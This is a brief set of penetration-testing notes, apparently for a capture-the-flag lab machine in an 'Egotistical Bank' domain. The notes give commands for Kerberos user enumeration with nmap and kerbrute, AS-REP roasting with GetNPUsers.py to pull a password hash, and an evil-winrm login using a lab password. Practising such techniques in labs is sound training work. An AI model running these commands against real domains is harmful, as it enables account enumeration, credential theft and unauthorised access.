```text
# Version detection + NSE scripts
nmap -Pn -sV -p $port --script="banner,krb5-enum-users" -oN "tcp_port_kerberos_nmap.txt" $ip
```

brute force kerberos names
```
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.95.180
```

If you have a username, see if you can get hash without password
```
GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.129.95.180 -request -no-pass
```

Once you get the creds
```
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```